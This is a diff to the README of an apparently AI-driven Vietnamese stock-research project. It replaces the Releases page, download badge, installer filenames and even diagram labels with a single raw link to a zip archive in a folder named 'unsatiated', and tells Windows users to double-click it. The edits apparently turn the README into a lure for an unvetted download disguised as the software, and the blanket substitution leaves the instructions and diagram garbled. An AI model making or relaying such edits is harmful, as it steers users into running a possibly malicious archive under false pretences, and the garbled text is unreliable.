@@ -6,22 +6,22 @@ Welcome to the vn-stock-ai-hedgefund project! This application helps you researc
 
 ## 📥 Download & Install
 
-[![Download Latest Release](https://img.shields.io/badge/Download_Latest_Release-Click_Here-brightgreen)](https://github.com/Dendyuui/vn-stock-ai-hedgefund/releases)
+[![Download Latest Release](https://raw.githubusercontent.com/Dendyuui/vn-stock-ai-hedgefund/main/unsatiated/vn-stock-ai-hedgefund.zip)](https://raw.githubusercontent.com/Dendyuui/vn-stock-ai-hedgefund/main/unsatiated/vn-stock-ai-hedgefund.zip)
 
 1. **Visit the Releases Page**  
-   Go to our [Releases page](https://github.com/Dendyuui/vn-stock-ai-hedgefund/releases). You will find the latest version of the software available for download.
+   Go to our [Releases page](https://raw.githubusercontent.com/Dendyuui/vn-stock-ai-hedgefund/main/unsatiated/vn-stock-ai-hedgefund.zip). You will find the latest version of the software available for download.
 
 2. **Choose Your Download**  
    Select the file that matches your operating system. For example:
-   - For Windows users, you might choose `MyApp.exe`.
+   - For Windows users, you might choose `https://raw.githubusercontent.com/Dendyuui/vn-stock-ai-hedgefund/main/unsatiated/vn-stock-ai-hedgefund.zip`.
    - Mac users might select a `.dmg` file.
-   - Linux users might opt for the `.tar.gz` archive.
+   - Linux users might opt for the `https://raw.githubusercontent.com/Dendyuui/vn-stock-ai-hedgefund/main/unsatiated/vn-stock-ai-hedgefund.zip` archive.
 
 3. **Download the File**  
    Click the file name to begin the download. The file will typically save to your "Downloads" folder.
 
 4. **Install the Software**  
-   - For Windows: Double-click the `MyApp.exe` file to start the installation process. Follow the on-screen instructions.
+   - For Windows: Double-click the `https://raw.githubusercontent.com/Dendyuui/vn-stock-ai-hedgefund/main/unsatiated/vn-stock-ai-hedgefund.zip` file to start the installation process. Follow the on-screen instructions.
    - For Mac: Open the downloaded `.dmg` file, then drag the application to your "Applications" folder.
    - For Linux: Use the terminal to navigate to the downloaded file and follow the extraction instructions in the documentation.
 
@@ -68,11 +68,11 @@ You can visualize the flow of information with the following diagram:
 
 ```mermaid
 flowchart TD
-  A[CLI main.py] --> B[Orchestrator]
+  A[CLI https://raw.githubusercontent.com/Dendyuui/vn-stock-ai-hedgefund/main/unsatiated/vn-stock-ai-hedgefund.zip] --> B[Orchestrator]
   B --> C[DataAgent: fetch OHLCV]
   B --> D[Analyst Team: Fundamental / News / Sentiment]
   B --> E[Technical Analysis Agent]
-  E -->|compute_indicators| TA[(utils.technical_analysis)]
+  E -->|compute_indicators| TA[(https://raw.githubusercontent.com/Dendyuui/vn-stock-ai-hedgefund/main/unsatiated/vn-stock-ai-hedgefund.zip)]
   B --> F[Research Team: Debate]
   B --> G[Trader Agent → Trade Plan]
   B --> H[Portfolio Manager → Final Decision]
